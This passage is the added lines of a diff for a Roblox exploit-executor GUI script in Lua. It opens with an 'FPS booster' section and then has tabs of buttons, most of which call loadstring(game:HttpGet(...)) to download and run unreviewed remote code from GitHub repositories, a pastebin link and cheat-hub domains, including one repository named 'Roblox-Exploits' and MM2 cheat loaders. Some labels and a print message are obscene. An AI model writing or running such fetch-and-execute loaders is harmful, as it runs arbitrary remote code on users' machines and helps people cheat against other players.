+    for _, v in ipairs(Workspace:GetDescendants()) do
+        if v:IsA("BasePart") then v.CastShadow = false end
+    end
+    Workspace.DescendantAdded:Connect(function(v)
+        if v:IsA("BasePart") then v.CastShadow = false end
+    end)
+end
+
+-- ──────────────────────────────────────────
+-- 3. LIGHTING POST-FX
+-- ──────────────────────────────────────────
+if Config.DisableLightingFX then
+    local killClasses = {
+        "BloomEffect", "BlurEffect", "SunRaysEffect",
+        "DepthOfFieldEffect", "ColorCorrectionEffect"
+    }
+    for _, child in ipairs(Lighting:GetChildren()) do
+        for _, cls in ipairs(killClasses) do
+            if child:IsA(cls) then child.Enabled = false end
+        end
+    end
+    Lighting.ChildAdded:Connect(function(child)
+        for _, cls in ipairs(killClasses) do
+            if child:IsA(cls) then child.Enabled = false end
+        end
+    end)
+end
+
+-- ──────────────────────────────────────────
+-- 4. ATMOSPHERE
+-- ──────────────────────────────────────────
+if Config.DisableAtmosphere then
+    local atmo = Lighting:FindFirstChildOfClass("Atmosphere")
+    if atmo then atmo:Destroy() end
+    Lighting.FogEnd   = 100000
+    Lighting.FogStart = 99999
+end
+
+-- ──────────────────────────────────────────
+-- 5. PARTICLES
+-- ──────────────────────────────────────────
+if Config.DisableParticles then
+    local particleClasses = { "ParticleEmitter", "Smoke", "Fire", "Sparkles" }
+    local function killParticle(v)
+        for _, cls in ipairs(particleClasses) do
+            if v:IsA(cls) then
+                v.Enabled = false
+                if v:IsA("ParticleEmitter") then v.Rate = 0 end
+            end
+        end
+    end
+    for _, v in ipairs(Workspace:GetDescendants()) do killParticle(v) end
+    Workspace.DescendantAdded:Connect(killParticle)
+end
+
+-- ──────────────────────────────────────────
+-- 6. TEXTURES / MATERIALS
+-- ──────────────────────────────────────────
+if Config.FlattenTextures then
+    local function isPlayerDescendant(obj)
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character and obj:IsDescendantOf(plr.Character) then return true end
+        end
+        return false
+    end
+    local function flattenPart(v)
+        if isPlayerDescendant(v) then return end
+        if v:IsA("BasePart") then
+            v.Material = Enum.Material.SmoothPlastic
+            local sa = v:FindFirstChildOfClass("SurfaceAppearance")
+            if sa then sa:Destroy() end
+        elseif v:IsA("Texture") or v:IsA("Decal") then
+            v.Transparency = 1
+        elseif v:IsA("SpecialMesh") then
+            v.TextureId = ""
+        elseif v:IsA("Model") then
+            v.LevelOfDetail = Enum.ModelLevelOfDetail.Disabled
+        end
+    end
+    for _, v in ipairs(Workspace:GetDescendants()) do flattenPart(v) end
+    Workspace.DescendantAdded:Connect(flattenPart)
+end
+
+-- ──────────────────────────────────────────
+-- 7. TERRAIN
+-- ──────────────────────────────────────────
+if Config.DisableTerrain then
+    local terrain = Workspace:FindFirstChildOfClass("Terrain")
+    if terrain then
+        terrain.WaterWaveSize     = 0
+        terrain.WaterWaveSpeed    = 0
+        terrain.WaterReflectance  = 0
+        terrain.WaterTransparency = 1
+        -- terrain.Decoration removed — no longer a valid API member
+    end
+end
+
+-- ──────────────────────────────────────────
+-- 8. STRIP ACCESSORIES + LAYERED CLOTHING
+-- ──────────────────────────────────────────
+-- Accessories are DIRECT children of the character model.
+-- WrapLayer / WrapTarget can be direct children OR nested inside
+-- HumanoidRootPart / body parts — scan both levels explicitly.
+
+local STRIP_CLASSES = {
+    Accessory  = true,
+    WrapLayer  = true,
+    WrapTarget = true,
+}
+
+local function shouldStrip(v)
+    if Config.StripAccessories     and v:IsA("Accessory")  then return true end
+    if Config.StripLayeredClothing and v:IsA("WrapLayer")  then return true end
+    if Config.StripLayeredClothing and v:IsA("WrapTarget") then return true end
+    return false
+end
+
+local function stripCharacter(char)
+    if not char then return end
+
+    -- Pass 1: direct children (catches Accessory at char level)
+    for _, v in ipairs(char:GetChildren()) do
+        if shouldStrip(v) then v:Destroy() end
+    end
+
+    -- Pass 2: full descendant scan (catches WrapLayer/WrapTarget inside parts)
+    for _, v in ipairs(char:GetDescendants()) do
+        if shouldStrip(v) then v:Destroy() end
+    end
+
+    -- Pass 3: guard against late-streamed items (avatar loading is async)
+    char.ChildAdded:Connect(function(v)
+        if shouldStrip(v) then
+            task.defer(function() if v and v.Parent then v:Destroy() end end)
+        end
+    end)
+    char.DescendantAdded:Connect(function(v)
+        if shouldStrip(v) then
+            task.defer(function() if v and v.Parent then v:Destroy() end end)
+        end
+    end)
+end
+
+if Config.StripAccessories or Config.StripLayeredClothing then
+    for _, plr in ipairs(Players:GetPlayers()) do
+        -- Character may already exist
+        if plr.Character then
+            stripCharacter(plr.Character)
+        end
+        plr.CharacterAdded:Connect(function(char)
+            -- Wait a tick — Roblox streams accessories slightly after CharacterAdded
+            task.wait()
+            stripCharacter(char)
+        end)
+    end
+    Players.PlayerAdded:Connect(function(plr)
+        plr.CharacterAdded:Connect(function(char)
+            task.wait()
+            stripCharacter(char)
+        end)
+    end)
+end
+
+-- ──────────────────────────────────────────
+-- 9. FORCE NIGHT SKY
+-- ──────────────────────────────────────────
+-- Games run a lighting controller that resets ClockTime every frame.
+-- The only reliable fix is to re-force it every Heartbeat.
+-- We also nuke Sky and Clouds objects for fillrate savings.
+
+if Config.ForceNight then
+    -- Kill Sky and Clouds immediately
+    for _, child in ipairs(Lighting:GetChildren()) do
+        if child:IsA("Sky") or child:IsA("Clouds") then
+            child:Destroy()
+        end
+    end
+
+    -- Block any re-added Sky/Clouds mid-session
+    Lighting.ChildAdded:Connect(function(child)
+        if child:IsA("Sky") or child:IsA("Clouds") then
+            task.defer(function() if child and child.Parent then child:Destroy() end end)
+        end
+    end)
+
+    -- Set ambient values once
+    Lighting.Brightness        = 0
+    Lighting.Ambient           = Color3.fromRGB(80, 80, 100)
+    Lighting.OutdoorAmbient    = Color3.fromRGB(80, 80, 100)
+    Lighting.ColorShift_Top    = Color3.new(0, 0, 0)
+    Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
+
+    -- Force ClockTime every heartbeat — overrides any game lighting script
+    RunService.Heartbeat:Connect(function()
+        Lighting.ClockTime = 0
+    end)
+end
+
+-- ──────────────────────────────────────────
+-- 10. OPTIONAL FPS CAP
+-- ──────────────────────────────────────────
+if Config.FPSCap and type(Config.FPSCap) == "number" then
+    local cap = Config.FPSCap
+    RunService.RenderStepped:Connect(function()
+        local frameTime = 1 / cap
+        local start = tick()
+        while tick() - start < frameTime do end
+    end)
+end
+
+print("[FPS Booster] Done. Enjoy your frames, bitch.")
+end,
+    })
+
+
+local Tab = Window:AddTab("R15 FE")
+
+
+Tab:AddButton({
+        Label    = "Body Language",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A1%F0%9D%97%88%F0%9D%96%BD%F0%9D%97%92%20%F0%9D%96%AB%F0%9D%96%BA%F0%9D%97%87%F0%9D%97%80%F0%9D%97%8E%F0%9D%96%BA%F0%9D%97%80%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Tall Test",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%96%BA%F0%9D%97%85%F0%9D%97%85%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Short Test",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%81%F0%9D%97%88%F0%9D%97%8B%F0%9D%97%8D%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Sonic",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%88%F0%9D%97%87%F0%9D%97%82%F0%9D%96%BC"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Zombie",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B9%F0%9D%97%88%F0%9D%97%86%F0%9D%96%BB%F0%9D%97%82%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Tall Guy",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%96%BA%F0%9D%97%85%F0%9D%97%85%20%F0%9D%96%A6%F0%9D%97%8E%F0%9D%97%92"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Spider",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%89%F0%9D%97%82%F0%9D%96%BD%F0%9D%96%BE%F0%9D%97%8B"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Gunner",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A6%F0%9D%97%8E%F0%9D%97%87%F0%9D%97%87%F0%9D%96%BE%F0%9D%97%8B"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Skybox",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%84%F0%9D%97%92%F0%9D%96%BB%F0%9D%97%88%F0%9D%97%91"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Snake",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%87%F0%9D%96%BA%F0%9D%97%84%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Viltrumite",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B5%F0%9D%97%82%F0%9D%97%85%F0%9D%97%8D%F0%9D%97%8B%F0%9D%97%8E%F0%9D%97%86%F0%9D%97%82%F0%9D%97%8D%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Neko",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AD%F0%9D%96%BE%F0%9D%97%84%F0%9D%97%88"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Noli",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AD%F0%9D%97%88%F0%9D%97%85%F0%9D%97%82"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Michael Jackson",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AC%F0%9D%97%82%F0%9D%96%BC%F0%9D%97%81%F0%9D%96%BA%F0%9D%96%BE%F0%9D%97%85%20%F0%9D%96%A9%F0%9D%96%BA%F0%9D%96%BC%F0%9D%97%84%F0%9D%97%8C%F0%9D%97%88%F0%9D%97%87"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Cars",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A2%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%8C"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Skateboard",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%84%F0%9D%96%BA%F0%9D%97%8D%F0%9D%96%BE%F0%9D%96%BB%F0%9D%97%88%F0%9D%96%BA%F0%9D%97%8B%F0%9D%96%BD"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Human Wheel",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%97%8E%F0%9D%97%86%F0%9D%96%BA%F0%9D%97%87%20%F0%9D%96%B6%F0%9D%97%81%F0%9D%96%BE%F0%9D%96%BE%F0%9D%97%85"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Boxer",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A1%F0%9D%97%88%F0%9D%97%91%F0%9D%96%BE%F0%9D%97%8B"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Dog",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A3%F0%9D%97%88%F0%9D%97%80"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Hand",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%96%BA%F0%9D%97%87%F0%9D%96%BD"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "D1ck",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A31%F0%9D%96%BC%F0%9D%97%84"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Mini",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AC%F0%9D%97%82%F0%9D%97%87%F0%9D%97%82"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Fish",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A5%F0%9D%97%82%F0%9D%97%8C%F0%9D%97%81"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Tank",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%96%BA%F0%9D%97%87%F0%9D%97%84"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Snail",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%87%F0%9D%96%BA%F0%9D%97%82%F0%9D%97%85"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Among Us",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A0%F0%9D%97%86%F0%9D%97%88%F0%9D%97%87%F0%9D%97%80%20%F0%9D%96%B4%F0%9D%97%8C"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Backpack",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A1%F0%9D%96%BA%F0%9D%96%BC%F0%9D%97%84%F0%9D%97%89%F0%9D%96%BA%F0%9D%96%BC%F0%9D%97%84"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Headless + Korblox",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD%F0%9D%97%85%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8C%20%2B%20%F0%9D%96%AA%F0%9D%97%88%F0%9D%97%8B%F0%9D%96%BB%F0%9D%97%85%F0%9D%97%88%F0%9D%97%91"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "No Legs + Head",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AD%F0%9D%97%88%20%F0%9D%96%AB%F0%9D%96%BE%F0%9D%97%80%F0%9D%97%8C%20%2B%20%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD"))() end,
+    })
+
+
+local Tab = Window:AddTab("R6 FE")
+
+
+Tab:AddButton({
+        Label    = "Sinister GUI",
+        Callback = function() loadstring(game:HttpGet("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animation-GUI-R6"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Air Pump",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A0%F0%9D%97%82%F0%9D%97%8B%20%F0%9D%96%AF%F0%9D%97%8E%F0%9D%97%86%F0%9D%97%89"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Drive",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A3%F0%9D%97%8B%F0%9D%97%82%F0%9D%97%8F%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Bang",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A1%F0%9D%96%BA%F0%9D%97%87%F0%9D%97%80"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Float Sit",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A5%F0%9D%97%85%F0%9D%97%88%F0%9D%96%BA%F0%9D%97%8D%20%F0%9D%96%B2%F0%9D%97%82%F0%9D%97%8D"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Hold This",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%97%88%F0%9D%97%85%F0%9D%96%BD%20%F0%9D%96%B3%F0%9D%97%81%F0%9D%97%82%F0%9D%97%8C"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Crouch",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A2%F0%9D%97%8B%F0%9D%97%88%F0%9D%97%8E%F0%9D%96%BC%F0%9D%97%81"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Crawl",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A2%F0%9D%97%8B%F0%9D%96%BA%F0%9D%97%90%F0%9D%97%85"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Levitate",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AB%F0%9D%96%BE%F0%9D%97%8F%F0%9D%97%82%F0%9D%97%8D%F0%9D%96%BA%F0%9D%97%8D%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Right Head Twist",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B1%F0%9D%97%82%F0%9D%97%80%F0%9D%97%81%F0%9D%97%8D%20%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD%20%F0%9D%96%B3%F0%9D%97%90%F0%9D%97%82%F0%9D%97%8C%F0%9D%97%8D"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Punch",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AF%F0%9D%97%8E%F0%9D%97%87%F0%9D%96%BC%F0%9D%97%81"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Floating",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A5%F0%9D%97%85%F0%9D%97%88%F0%9D%96%BA%F0%9D%97%8D%F0%9D%97%82%F0%9D%97%87%F0%9D%97%80%20%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Jerking",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A9%F0%9D%96%BE%F0%9D%97%8B%F0%9D%97%84%F0%9D%97%82%F0%9D%97%87%F0%9D%97%80"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "T",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Arms Up",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A0%F0%9D%97%8B%F0%9D%97%86%F0%9D%97%8C%20%F0%9D%96%B4%F0%9D%97%89"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Backpack",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A1%F0%9D%96%BA%F0%9D%96%BC%F0%9D%97%84%F0%9D%97%89%F0%9D%96%BA%F0%9D%96%BC%F0%9D%97%84%20(%F0%9D%97%8B6)"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Tool Slash",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%97%88%F0%9D%97%88%F0%9D%97%85%20%F0%9D%96%B2%F0%9D%97%85%F0%9D%96%BA%F0%9D%97%8C%F0%9D%97%81"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Head Throw",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A7%F0%9D%96%BE%F0%9D%96%BA%F0%9D%96%BD%20%F0%9D%96%B3%F0%9D%97%81%F0%9D%97%8B%F0%9D%97%88%F0%9D%97%90"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Groovy!",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A6%F0%9D%97%8B%F0%9D%97%88%F0%9D%97%88%F0%9D%97%8F%F0%9D%97%92!"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Spin",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B2%F0%9D%97%89%F0%9D%97%82%F0%9D%97%87"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Punches",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AF%F0%9D%97%8E%F0%9D%97%87%F0%9D%96%BC%F0%9D%97%81%F0%9D%96%BE%F0%9D%97%8C"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Tool Lunge",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%97%88%F0%9D%97%88%F0%9D%97%85%20%F0%9D%96%AB%F0%9D%97%8E%F0%9D%97%87%F0%9D%97%80%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Lay Down",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AB%F0%9D%96%BA%F0%9D%97%92%20%F0%9D%96%A3%F0%9D%97%88%F0%9D%97%90%F0%9D%97%87"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Take Sip",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B3%F0%9D%96%BA%F0%9D%97%84%F0%9D%96%BE%20%F0%9D%96%A0%20%F0%9D%96%B2%F0%9D%97%82%F0%9D%97%89"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "2013 Dance",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/2013%20%F0%9D%96%A3%F0%9D%96%BA%F0%9D%97%87%F0%9D%96%BC%F0%9D%96%BE"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Point",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%AF%F0%9D%97%88%F0%9D%97%82%F0%9D%97%87%F0%9D%97%8D"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Dab",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A3%F0%9D%96%BA%F0%9D%96%BB"))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Dino Walk",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%A3%F0%9D%97%82%F0%9D%97%87%F0%9D%97%88%20%F0%9D%96%B6%F0%9D%96%BA%F0%9D%97%85%F0%9D%97%84"))() end,
+    })
+
+
+
+local Tab = Window:AddTab("Games")
+
+
+Tab:AddButton({
+        Label    = "Lucky Block Battlegrounds",
+        Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/JbWJ7R7i", true))() end,
+    })
+
+Tab:AddButton({
+        Label    = "MM2 Thunder Hub",
+        Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/thunderXhub/ThunderXHUB/refs/heads/main/loader'))() end,
+    })
+
+Tab:AddButton({
+        Label    = "Overdrive H",
+        Callback = function() loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))() end,
+    })
+
+
+Tab:AddButton({
+        Label    = "Honey MM2",
+        Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Loader.luau"))() end,
+    })
